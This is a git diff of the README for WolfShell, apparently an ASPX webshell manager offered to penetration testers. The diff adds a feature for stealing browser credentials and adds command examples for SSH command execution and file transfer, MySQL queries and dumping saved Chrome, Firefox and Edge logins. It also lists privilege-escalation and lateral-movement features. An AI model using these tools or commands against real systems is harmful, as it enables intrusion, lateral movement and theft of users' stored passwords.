@@ -8,7 +8,6 @@
 [![GitHub forks](https://img.shields.io/github/forks/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)
 [![GitHub license](https://img.shields.io/github/license/0x7556/wolfshell)](https://github.com/0x7556/wolfshell)
 
-
 # 金刚狼：专为ASPX设计的高级WebShell管理工具
 
 金刚狼是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、权限提升和内网穿透能力。
@@ -30,13 +29,13 @@
 *   C#代码执行： 支持在运行时动态加载与执行 C# 代码。
 *   端口转发： 实现本地端口到远程内网主机的映射，方便安全地访问内部网络服务。
 *   HTTP代理： 一键内存注入Suo5高性能 HTTP 隧道代理工具。
-*   Potato提权： 利用系统服务漏洞进行权限提升，支持两种提权模块：
-*   efspotato： 利用 EFSPotato 实现权限提升。
-*   badpotato： 利用 BadPotato 实现权限提升。
-*   内网级联Cmd命令执行： 支持在复杂的内网环境中，级联内网webshell执行 CMD 命令进行横向移动。
-*   内网级联PowerShell执行： 支持在复杂的内网环境中，级联内网webshell执行 PowerShell 命令进行横向移动。
-*   sshcmd：SSH 远程命令执行工具，支持通过 webshell 建立 SSH 链接，实现对内网主机的命令执行与横向移动。
-*   mysqlcmd：MySQL 数据库连接工具，支持通过 webshell 连接内网MySQL，执行查询、导入导出等数据库操作。
+*   EfsPotato： 利用系统服务漏洞进行权限提升。
+*   BadPotato： 利用系统服务漏洞进行权限提升。
+*   内网级联Cmd命令执行： 支持在复杂的内网环境中，级联内网 WebShell 执行 CMD 命令进行横向移动。
+*   内网级联PowerShell执行： 支持在复杂的内网环境中，级联内网 WebShell 执行 PowerShell 命令进行横向移动。
+*   SshCmd：SSH 远程命令执行工具，支持通过 WebShell 建立 SSH 链接，实现对内网主机的命令执行与横向移动。
+*   MyysqlCmd：MySQL 数据库连接工具，支持通过 WebShell 连接内网MySQL，执行查询、导入导出等数据库操作。
+*   SharpWeb：浏览器凭据抓取工具，支持通过 WebShell 提取已保存的 Chrome、Firefox、Edge 登录信息与凭据。
 
 ## 辅助功能
 
@@ -279,12 +278,58 @@ return "Error occurred: " + ex.Message;
 
 ### SSH远程命令执行示例
 
+```bash
+Usage:
+
+sshcmd 192.168.50.128 22 root toor id
+sshcmd 192.168.50.128 22 root toor download /tmp/down.rar c:\down.rar
+sshcmd 192.168.50.128 22 root toor upload c:\upload.rar /tmp/upload.rar
+
+Keybord
+sshcmd 192.168.50.128 22 root toor download2 /tmp/down.rar c:\down.rar
+sshcmd 192.168.50.128 22 root toor upload2 c:\upload.rar /tmp/upload.rar
+```
+
 ![Hacking](http://www.18k.icu/img/wolfshell/sshcmd.png)
 
 ### Mysql数据库连接示例
 
+```bash
+mysqlcmd host port user pass dbname sqlstr
+mysqlcmd host port user pass dbname sqlb64
+
+Demo:
+mysqlcmd 192.168.50.139 3306 root WolfShell mysql info
+mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT VERSION(); ""
+mysqlcmd 192.168.50.139 3306 root WolfShell mysql ""SELECT 3+5 ""
+mysqlcmd 192.168.50.139 3306 root WolfShell mysql c2VsZWN0IDMrNQ==";
+```
+
 ![Hacking](http://www.18k.icu/img/wolfshell/mysqlcmd.png)
 
+### 读取浏览器密码示例
+
+```bash
+Usage:
+    SharWeb arg0 [arg1 arg2 ...]
+
+Arguments:
+    all       - Retrieve all Chrome, FireFox and IE/Edge credentials.
+    full      - The same as 'all'
+    chrome    - Fetch saved Chrome logins. e.g. -d Directory
+    firefox   - Fetch saved FireFox logins. e.g. -p masterkey -d Directory
+    edge      - Fetch saved Internet Explorer/Microsoft Edge logins.
+
+Demo:
+    SharWeb all
+    SharWeb chrome
+    SharWeb chrome -d C:\Output
+    SharWeb firefox -p mymasterkey -d C:\Output
+    SharWeb edge
+=======================================================================
+```
+
+![Hacking](http://www.18k.icu/img/wolfshell/SharpWeb.png)
 
 ## 免责声明
 
@@ -302,4 +347,3 @@ return "Error occurred: " + ex.Message;
 ## 关注
 
 ![WolfShell](http://www.18k.icu/img/join.png)
-
